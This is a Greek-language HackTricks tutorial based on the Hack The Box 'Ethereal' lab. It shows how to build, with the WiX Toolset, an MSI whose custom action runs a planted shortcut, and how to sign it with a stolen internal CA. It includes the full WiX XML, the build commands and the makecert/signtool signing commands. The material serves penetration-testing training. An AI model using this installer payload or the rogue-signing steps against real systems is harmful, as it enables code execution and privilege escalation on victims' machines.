# Δημιουργία MSI με Custom-Action με WiX

{{#include ../../banners/hacktricks-training.md}}

Αυτή η ιστορική αλυσίδα του Hack The Box χρησιμοποίησε το WiX Toolset v3 για τη δημιουργία ενός MSI που εκκινούσε ένα προηγουμένως τοποθετημένο αρχείο `.lnk`. **Ένα MSI δεν έχει αυτόματα elevated δικαιώματα**: η εκτέλεση πραγματοποιείται στο context που καθορίζεται από την πολιτική του Windows Installer, τα attributes του custom action και από το άτομο που το εγκαθιστά. Στο αναφερόμενο σενάριο, ο attacker έκλεψε επίσης ένα trusted signing CA και τοποθέτησε το υπογεγραμμένο MSI σε έναν φάκελο που παρακολουθούσε ένας άλλος χρήστης.<sup>[[1]](#references)[[3]](#references)</sup>

Για μια ολοκληρωμένη κατανόηση των παραδειγμάτων χρήσης του wix MSI, συνιστάται να συμβουλευτείτε [αυτήν τη σελίδα](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Εδώ μπορείτε να βρείτε διάφορα παραδείγματα που παρουσιάζουν τη χρήση του wix MSI.<sup>[[2]](#references)</sup>

Το MSI εκτελεί το `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Το αρχικό XML του WiX v3 διατηρείται παρακάτω:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Το `InstallerVersion` δηλώνει την ελάχιστη έκδοση του Windows Installer και το `Compressed="yes"` σηματοδοτεί ότι το package είναι συμπιεσμένο. Το `Stage1` είναι deferred, αλλά έχει `Impersonate="yes"`, επομένως εκτελείται με το impersonated token του χρήστη που πραγματοποιεί την εγκατάσταση· η αλλαγή προνομίων σε αυτό το σενάριο προήλθε από τον privileged user που άνοιξε αργότερα το MSI και όχι από το ότι αυτό το attribute παραχωρεί μαγικά δικαιώματα SYSTEM.<sup>[[3]](#references)</sup>

Κάντε compile το source σε ένα WiX object με το `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Συνδέστε αυτό το object σε ένα MSI με το `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Βήμα υπογραφής που χρησιμοποιήθηκε στην αρχική αλυσίδα

Η ροή εργασίας-στόχος αποδεχόταν πακέτα υπογεγραμμένα από μια παραβιασμένη εσωτερική CA. Η περιγραφή δημιούργησε ένα πιστοποιητικό υπογραφής από τα ανακτημένα `MyCA.cer`/`MyCA.pvk`, δημιούργησε ένα PFX και υπέγραψε το MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Ο attacker τοποθέτησε έπειτα το signed package στο `D:\DEV\MSIs` και περίμενε το privileged workflow/user να το εκτελέσει. Διατηρήστε αυτή την προϋπόθεση κατά την προσαρμογή της τεχνικής: χωρίς elevated installation path, unsafe policy όπως το `AlwaysInstallElevated` ή privileged victim, αυτό το package εκτελείται μόνο με τα δικαιώματα του current user.

## References

- [1] [Hack The Box - Ethereal: Δημιουργία κακόβουλου msi και απόκτηση root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Μια σύντομη εισαγωγή: Δημιουργία MSI installer με WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Custom actions αναβαλλόμενης εκτέλεσης (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
